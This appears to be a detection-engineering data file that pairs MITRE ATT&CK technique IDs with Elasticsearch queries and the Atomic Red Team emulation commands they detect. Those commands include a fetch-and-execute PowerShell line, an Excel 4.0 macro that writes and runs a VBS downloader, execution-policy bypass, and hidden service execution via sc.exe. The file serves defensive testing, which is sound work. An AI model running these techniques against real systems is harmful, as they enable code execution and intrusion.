T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""Out-ATHPowerShellCommandLineParameter""}},
                   {""match"": {""CommandLine"": ""-CommandParamVariation""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable;
 if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;
 Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop",2
T1047,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match"": {""CommandLine"": ""wmic""}},
                    {""match"": {""CommandLine"": ""uninstall""}},
                    {""match_phrase"": {""CommandLine"": ""product where""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","wmic /node:""127.0.0.1"" product where ""name like 'Tightvnc%%'"" call uninstall",2
T1047,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""Invoke-WmiMethod""}},
                     {""match_phrase"": {""CommandLine"": ""Win32_Atomic""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(""Win32_Process"")); 
$NewClass = $Class.Derive(""Win32_Atomic""); 
$NewClass.Put(); Invoke-WmiMethod -Path Win32_Atomic -Name create -ArgumentList notepad.exe",2
T1059.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""Start-Process""}},
                    {""match_phrase"": {""CommandLine"": ""T1059.003_script.bat""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Start-Process $env:TEMP\T1059.003_script.bat,2
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""powershell.exe""}},
                {""match_phrase"": {""CommandLine"": "".\Emulate-Administrator-Tasks.ps1""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","start powershell.exe -ArgumentList ""-NoP"",""-StA"",""-ExecutionPolicy"",""bypass"","".\Emulate-Administrator-Tasks.ps1""",2
T1059.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match"": {""CommandLine"": ""Invoke-Maldoc""}},
                 {""match"": {""CommandLine"": ""-macroFile""}},
                  {""match"": {""CommandLine"": ""-officeProduct""}},
                   {""match"": {""CommandLine"": ""-sub""}},
                     {""match"": {""CommandLine"": ""Word""}},
                 {""match"": {""CommandLine"": ""Exec""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing);
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt"" -officeProduct ""Word"" -sub ""Exec""",2
T1204.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"": {""CommandLine"": ""New-Object -COMObject""}},
                 {""match_phrase"": {""CommandLine"": ""Excel.Application""}},
                 {""wildcard"": {""CommandLine"": ""*.Excel4MacroSheets.Add""}},
                {""wildcard"": {""CommandLine"": ""*.Cells.Item""}},
                {""wildcard"": {""CommandLine"": ""*.Run""}},
                {""wildcard"": {""CommandLine"": ""procexp*""}},
                {""wildcard"": {""CommandLine"": ""*.vbs""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$fname = ""$env:TEMP\atomic_redteam_x4m_exec.vbs""; 
$fname1 = ""$env:TEMP\procexp.exe""; 
if (Test-Path $fname) {;   Remove-Item $fname;   Remove-Item $fname1; }; 
$xlApp = New-Object -COMObject ""Excel.Application""; 
$xlApp.Visible = $True; 
$xlApp.DisplayAlerts = $False; 
$xlBook = $xlApp.Workbooks.Add(); 
$sheet = $xlBook.Excel4MacroSheets.Add(); 
if (""$env:Username"" -ne """") {;
   $sheet.Cells.Item(1,1) = ""$env:Username"";
 } else {; 
   $sheet.Cells.Item(1,1) = ""=GET.WORKSPACE(26)""; 
}; 
$sheet.Cells.Item(2,1) = ""procexp.exe""; 
$sheet.Cells.Item(3,1) = ""atomic_redteam_x4m_exec.vbs""; 
$sheet.Cells.Item(4,1) = ""=IF(ISNUMBER(SEARCH(`""64`"",GET.WORKSPACE(1))), GOTO(A5),)""; 
$sheet.Cells.Item(5,1) = ""=FOPEN(`""C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A3&`""`"", 3)""; 
$sheet.Cells.Item(6,1) = ""=FWRITELN(A5, `""url = `""`""https://live.sysinternals.com/procexp.exe`""`""`"")""; 
$sheet.Cells.Item(7,1) = ""=FWRITELN(A5, `""`"")""; 
$sheet.Cells.Item(8,1) = ""=FWRITELN(A5, `""Set winHttp = CreateObject(`""`""WinHTTP.WinHTTPrequest.5.1`""`"")`"")""; 
$sheet.Cells.Item(9,1) = ""=FWRITELN(A5, `""winHttp.Open `""`""GET`""`"", url, False`"")""; 
$sheet.Cells.Item(10,1) = ""=FWRITELN(A5, `""winHttp.Send`"")""; 
$sheet.Cells.Item(11,1) = ""=FWRITELN(A5, `""If winHttp.Status = 200 Then`"")""; 
$sheet.Cells.Item(12,1) = ""=FWRITELN(A5, `""Set oStream = CreateObject(`""`""ADODB.Stream`""`"")`"")""; 
$sheet.Cells.Item(13,1) = ""=FWRITELN(A5, `""oStream.Open`"")""; 
$sheet.Cells.Item(14,1) = ""=FWRITELN(A5, `""oStream.Type = 1`"")""; 
$sheet.Cells.Item(15,1) = ""=FWRITELN(A5, `""oStream.Write winHttp.responseBody`"")""; 
$sheet.Cells.Item(16,1) = ""=FWRITELN(A5, `""oStream.SaveToFile `""`""C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A2&`""`""`"", 2`"")""; 
$sheet.Cells.Item(17,1) = ""=FWRITELN(A5, `""oStream.Close`"")"";
$sheet.Cells.Item(18,1) = ""=FWRITELN(A5, `""End If`"")""; 
$sheet.Cells.Item(19,1) = ""=FCLOSE(A5)""; 
$sheet.Cells.Item(20,1) = ""=EXEC(`""explorer.exe C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A3&`""`"")""; 
$sheet.Cells.Item(21,1) = ""=WAIT(NOW()+`""00:00:05`"")""; 
$sheet.Cells.Item(22,1) = ""=EXEC(`""explorer.exe C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A2&`""`"")""; 
$sheet.Cells.Item(23,1) = ""=HALT()""; 
$sheet.Cells.Item(1,1).Name = ""runme""; 
$xlApp.Run(""runme""); 
$xlApp.Quit(); 
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null; 
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null; 
[System.GC]::Collect(); 
[System.GC]::WaitForPendingFinalizers(); 
Remove-Variable xlBook; 
Remove-Variable xlApp",0(2)
T1559.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""0a4081_DDE_Document.docx""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",start 0a4081_DDE_Document.docx,1(2)
T1569.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""wildcard"": {""CommandLine"": ""*.txt""}},
                {""match_phrase"": {""CommandLine"": ""create""}},
                {""match_phrase"": {""CommandLine"": ""start""}},
                {""match_phrase"": {""CommandLine"": ""delete ""}}
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","sc.exe create ARTService binPath= ""%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt"" 
&& sc.exe start ARTService && sc.exe delete ARTService",2
T1106,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Microsoft.NET\\Framework\\v4.0.30319\\csc.exe""}},
                 {""wildcard"": {""CommandLine"": ""*.cs""}}
       ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:""%tmp%\T1106.exe"" /target:exe 7175f8_CreateProcess.cs && %tmp%/T1106.exe",2
